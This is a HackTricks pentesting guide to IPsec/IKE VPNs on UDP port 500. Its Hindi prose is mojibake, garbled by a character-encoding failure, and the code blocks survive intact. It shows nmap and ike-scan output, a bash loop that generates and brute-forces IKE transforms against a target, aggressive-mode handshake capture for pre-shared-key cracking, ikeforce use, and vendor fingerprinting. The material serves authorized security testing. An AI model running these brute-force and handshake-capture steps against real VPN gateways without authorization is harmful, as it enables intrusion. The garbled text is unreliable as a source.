# 500/udp - IPsec/IKE VPN рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдпрд╛ **рдореБрдЭреЗ** **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рд╡реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░реЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХрд╛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рдкреНрд░реЛрдПрдХреНрдЯрд┐рд╡ рдзрд╛рд░рдгрд╛ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреА рдкреВрд░реА рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ, API рд╕реЗ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдо рддрдХ рдореБрджреНрджреЗ рдЦреЛрдЬрддрд╛ рд╣реИред [**рдЖрдЬ рд╣реА рдореБрдлреНрдд рдореЗрдВ рдЗрд╕рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**IPsec** рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ (LAN-to-LAN) рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдореБрдЦреНрдп рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдиреНрдпрддрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реИ рдФрд░ рджреВрд░рд╕реНрде рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдЧреЗрдЯрд╡реЗ (рджреВрд░рд╕реНрде рдкрд╣реБрдВрдЪ) рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЙрджреНрдпрдореА VPN рд╕рдорд╛рдзрд╛рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдореВрд▓рдзрд╛рд░ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИред

рджреЛ рдмрд┐рдВрджреБрдУрдВ рдХреЗ рдмреАрдЪ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдШрдЯрди (SA)** рдХреА рд╕реНрдерд╛рдкрдирд╛ **IKE** рджреНрд╡рд╛рд░рд╛ рдкреНрд░рдмрдВрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ, рдЬреЛ ISAKMP рдХреЗ рдЫрд╛рддреЗ рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ, рдПрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдЬреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдФрд░ рдХреБрдВрдЬреА рд╡рд┐рдирд┐рдордп рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рд╡рд┐рдХрд╕рд┐рдд рд╣реЛрддреА рд╣реИ:

- **рдЪрд░рдг 1:** рджреЛ рдЕрдВрддрдмрд┐рдВрджреБрдУрдВ рдХреЗ рдмреАрдЪ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдЪреИрдирд▓ рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕реЗ рдПрдХ рдкреВрд░реНрд╡-рд╕рд╛рдЭрд╛ рдХреБрдВрдЬреА (PSK) рдпрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдореБрдЦреНрдп рдореЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рддреАрди рдЬреЛрдбрд╝реЛрдВ рдХреЗ рд╕рдВрджреЗрд╢ рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВ, рдпрд╛ **рдЖрдХреНрд░рд╛рдордХ рдореЛрдб**ред
- **рдЪрд░рдг 1.5:** рдпрд╣ рдЪрд░рдг рдЕрдирд┐рд╡рд╛рд░реНрдп рдирд╣реАрдВ рд╣реИ, рдЗрд╕реЗ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЪрд░рдг рдХреЗ рд░реВрдк рдореЗрдВ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкрд╣рдЪрд╛рди рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд░рд╣рд╛ рд╣реИ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред
- **рдЪрд░рдг 2:** рдпрд╣ рдЪрд░рдг **ESP** рдФрд░ **AH** рдХреЗ рд╕рд╛рде рдбреЗрдЯрд╛ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреА рдмрд╛рддрдЪреАрдд рдХреЗ рд▓рд┐рдП рд╕рдорд░реНрдкрд┐рдд рд╣реИред рдпрд╣ рдЪрд░рдг рдлреЗрдЬ 1 рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд╡рд┐рдкрд░реАрдд рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ **рдкрд░реНрдлреЗрдХреНрдЯ рдлреЙрд░рд╡рд░реНрдб рд╕реАрдХреНрд░реЗрд╕реА (PFS)** рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░ рд╕рдХреЗрдВ, рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрдврд╝рд╛рддреЗ рд╣реИрдВред


**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкреЛрд░реНрдЯ:** 500/udp

## **nmap** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реЗрд╡рд╛ рдЦреЛрдЬреЗрдВ
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **рдПрдХ рд╡реИрдз рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬрдирд╛**

IPSec рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗрд╡рд▓ рдПрдХ рдпрд╛ рдХреБрдЫ рдкрд░рд┐рд╡рд░реНрддрди рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдПрдХ рдкрд░рд┐рд╡рд░реНрддрди рдПрдХ рдорд╛рдиреЛрдВ рдХрд╛ рд╕рдВрдпреЛрдЬрди рд╣реИред **рдкреНрд░рддреНрдпреЗрдХ рдкрд░рд┐рд╡рд░реНрддрди** рдореЗрдВ DES рдпрд╛ 3DES рдЬреИрд╕реЗ **рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо**, SHA рдпрд╛ MD5 рдЬреИрд╕реЗ **рдЕрдЦрдВрдбрддрд╛ рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо**, рдкреВрд░реНрд╡-рд╕рд╛рдЭрд╛ рдХреА рдЧрдИ рдХреБрдВрдЬреА рдЬреИрд╕реЗ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдкреНрд░рдХрд╛рд░**, Diffie-Hellman 1 рдпрд╛ 2 рдЬреИрд╕реЗ рдХреБрдВрдЬреА **рд╡рд┐рддрд░рдг рдПрд▓реНрдЧреЛрд░рд┐рдереНрдо** рдФрд░ 28800 рд╕реЗрдХрдВрдб рдЬреИрд╕реЗ **рдЬреАрд╡рдирдХрд╛рд▓** рд╢рд╛рдорд┐рд▓ рд╣реЛрддреЗ рд╣реИрдВред

рдлрд┐рд░, рдкрд╣рд▓реА рдЪреАрдЬ рдЬреЛ рдЖрдкрдХреЛ рдХрд░рдиреА рд╣реЛрдЧреА рд╡рд╣ рд╣реИ **рдПрдХ рд╡реИрдз рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬрдирд╛**, рддрд╛рдХрд┐ рд╕рд░реНрд╡рд░ рдЖрдкрд╕реЗ рдмрд╛рдд рдХрд░реЗред рдЗрд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЙрдкрдХрд░рдг **ike-scan** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Ike-scan рдореБрдЦреНрдп рдореЛрдб рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдПрдХ ISAKMP рд╣реИрдбрд░ рдФрд░ рдПрдХ рдкреНрд░рд╕реНрддрд╛рд╡ рдХреЗ рд╕рд╛рде рдЧреЗрдЯрд╡реЗ рдХреЛ рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдЖрда рдкрд░рд┐рд╡рд░реНрддрди** рд╣реЛрддреЗ рд╣реИрдВред

рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рдЖрдк рдЕрдВрддрдмрд┐рдВрджреБ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдХреБрдЫ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рдкрд┐рдЫрд▓реЗ рдЬрд╡рд╛рдм рдореЗрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдПрдХ рдлрд╝реАрд▓реНрдб рд╣реИ рдЬрд┐рд╕реЗ **AUTH** рдирд╛рдо рд╕реЗ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕рдХрд╛ рдорд╛рди **PSK** рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ vpn рдХреЛ рдПрдХ рдкреВрд░реНрд╡-рд╕рд╛рдЭрд╛ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (рдФрд░ рдпрд╣ рдПрдХ рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рдХреЗ рд▓рд┐рдП рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЕрдЪреНрдЫрд╛ рд╣реИ)ред  
**рдЖрдЦрд┐рд░реА рдкрдВрдХреНрддрд┐ рдХрд╛ рдорд╛рди рднреА рдмрд╣реБрдд рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ:**

* _0 returned handshake; 0 returned notify:_ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд▓рдХреНрд╖реНрдп **рдПрдХ IPsec рдЧреЗрдЯрд╡реЗ рдирд╣реАрдВ рд╣реИ**ред
* _**1 returned handshake; 0 returned notify:**_ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рд▓рдХреНрд╖реНрдп IPsec рдХреЗ рд▓рд┐рдП рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ IKE рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рд╣реИ, рдФрд░ рдЖрдкрдиреЗ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдПрдХ рдпрд╛ рдПрдХ рд╕реЗ рдЕрдзрд┐рдХ рдЯреНрд░рд╛рдВрд╕рдлрд╝реЙрд░реНрдо рд╕реНрд╡реАрдХрд╛рд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВ** (рдПрдХ рдорд╛рдиреНрдп рдЯреНрд░рд╛рдВрд╕рдлрд╝реЙрд░реНрдо рдЖрдЙрдЯрдкреБрдЯ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
* _0 returned handshake; 1 returned notify:_ VPN рдЧреЗрдЯрд╡реЗ рдПрдХ рд╕реВрдЪрдирд╛ рд╕рдВрджреЗрд╢ рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддреЗ рд╣реИрдВ рдЬрдм **рдХреЛрдИ рднреА рдЯреНрд░рд╛рдВрд╕рдлрд╝реЙрд░реНрдо рд╕реНрд╡реАрдХрд╛рд░рдиреЗ рдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реИ** (рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХреБрдЫ рдЧреЗрдЯрд╡реЗ рдРрд╕рд╛ рдирд╣реАрдВ рдХрд░рддреЗ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдЧреЗ рдХреА рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдФрд░ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд рдкреНрд░рд╕реНрддрд╛рд╡ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП)ред

рдлрд┐рд░, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рд╣реИ рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк рддреАрд╕рд░реЗ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ **рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдереЛрдбрд╝рд╛ рд╕рд╛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:**

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ рдЖрдкрдХреЛ рд╕рднреА рд╕рдВрднрд╛рд╡рд┐рдд рдкрд░рд┐рд╡рд░реНрддрди рдмрдирд╛рдиреЗ рд╣реЛрдВрдЧреЗ:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
рдФрд░ рдлрд┐рд░ ike-scan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░реЗрдВ (рдпрд╣ рдХрдИ рдорд┐рдирдЯ рд▓реЗ рд╕рдХрддрд╛ рд╣реИ):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
рдпрджрд┐ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд╛рдо рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рд╢рд╛рдпрдж рд╕рд░реНрд╡рд░ рдорд╛рдиреНрдп рдЯреНрд░рд╛рдВрд╕рдлреЙрд░реНрдо рдХреЗ рдмрд┐рдирд╛ рд╣реИрдВрдбрд╢реЗрдХ рдХреЗ рдмрд┐рдирд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣рд╛ рд╣реИред рдлрд┐рд░, рдЖрдк рдПрдХ рд╣реА рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдЧреНрд░реЗрд╕рд┐рд╡ рдореЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Hopefully **рдПрдХ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рд╡рд╛рдкрд╕ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛**.\
рдЖрдк [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдПрдХ рд╣реА рд╣рдорд▓рд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк [**ikeforce**](https://github.com/SpiderLabs/ikeforce) рдХреЗ рд╕рд╛рде рдкрд░рд┐рд╡рд░реНрддрдиреЛрдВ рдХреЛ рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд░рдиреЗ рдХрд╛ рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

**DH рд╕рдореВрд╣: 14 = 2048-рдмрд┐рдЯ MODP** рдФрд░ **15 = 3072-рдмрд┐рдЯ**\
**2 = HMAC-SHA = SHA1 (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ)ред `--trans` рдкреНрд░рд╛рд░реВрдк рд╣реИ $Enc,$Hash,$Auth,$DH**

рд╕рд┐рд╕реНрдХреЛ рдЗрд╕рдХрд╛ рд╕реБрдЭрд╛рд╡ рджреЗрддрд╛ рд╣реИ рдХрд┐ DH рд╕рдореВрд╣ 1 рдФрд░ 2 рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВ рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдкрд░реНрдпрд╛рдкреНрдд рдордЬрдмреВрдд рдирд╣реАрдВ рд╣реИрдВред рд╡рд┐рд╢реЗрд╖рдЬреНрдЮ рдорд╛рдирддреЗ рд╣реИрдВ рдХрд┐ **рд╕рдВрд╕рд╛рдзрдиреЛрдВ рд╕реЗ рднрд░рдкреВрд░ рджреЗрд╢** рдЖрд╕рд╛рдиреА рд╕реЗ рдЗрди рдХрдордЬреЛрд░ рд╕рдореВрд╣реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рдбреЗрдЯрд╛ рдХреЗ рдПрдиреНрдХреНрд░рд┐рдкреНрд╢рди рдХреЛ рддреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕реЗ рддреЗрдЬреА рд╕реЗ рдХреЛрдб рддреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рддрдХрдиреАрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдХрд╛рдлреА рдкреИрд╕рд╛ рдЦрд░реНрдЪ рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА рджреЗрд╢реЛрдВ рдХреЛ рдпрджрд┐ рдпрд╣ рдПрдХ рд╕рдореВрд╣ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬреЛ рдордЬрдмреВрдд рдирд╣реАрдВ рд╣реИ (рдЬреИрд╕реЗ 1,024-рдмрд┐рдЯ рдпрд╛ рдЫреЛрдЯрд╛) рддреЛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб рдбреЗрдЯрд╛ рдХреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд╕рдордп рдореЗрдВ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

### рд╕рд░реНрд╡рд░ рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯрд┐рдВрдЧ

рдлрд┐рд░, рдЖрдк ike-scan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг рдХреЗ **рд╡рд┐рдХреНрд░реЗрддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЙрдкрдХрд░рдг рдПрдХ рдкреНрд░рд╛рд░рдВрднрд┐рдХ рдкреНрд░рд╕реНрддрд╛рд╡ рднреЗрдЬрддрд╛ рд╣реИ рдФрд░ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐ рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддрд╛ рд╣реИред рдлрд┐рд░, рдпрд╣ рд╕рд░реНрд╡рд░ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рд╕рдВрджреЗрд╢реЛрдВ рдФрд░ рдорд┐рд▓рд╛рди рдЬрд╡рд╛рдм рдкреИрдЯрд░реНрди рдХреЗ рдмреАрдЪ рдХрд╛ **рд╕рдордп** рд╡рд┐рд╢реНрд▓реЗрд╖рдг рдХрд░рдХреЗ, рдкреЗрдВрдЯреЗрд╕реНрдЯрд░ рд╡реАрдкреАрдПрди рдЧреЗрдЯрд╡реЗ рд╡рд┐рдХреНрд░реЗрддрд╛ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдХреБрдЫ рд╡реАрдкреАрдПрди рд╕рд░реНрд╡рд░ рдЖрдИрдХреЗ рдХреЗ рд╕рд╛рде рд╡реИрдХрд▓реНрдкрд┐рдХ **рд╡рд┐рдХреНрд░реЗрддрд╛ рдЖрдИрдбреА (рд╡реАрдЖрдИрдбреА) рдкреЗрд▓реЛрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗред

**рдЖрд╡рд╢реНрдпрдХ рд╣реЛрдиреЗ рдкрд░ рдорд╛рдиреНрдп рдкрд░рд┐рд╡рд░реНрддрди рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ** (рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ --trans)

рдпрджрд┐ рдЖрдИрдХреЗ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рд╡рд┐рдХреНрд░реЗрддрд╛ рдХреМрди рд╣реИ рддреЛ рдпрд╣ рдкреНрд░рд┐рдВрдЯ рдХрд░реЗрдЧрд╛:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:
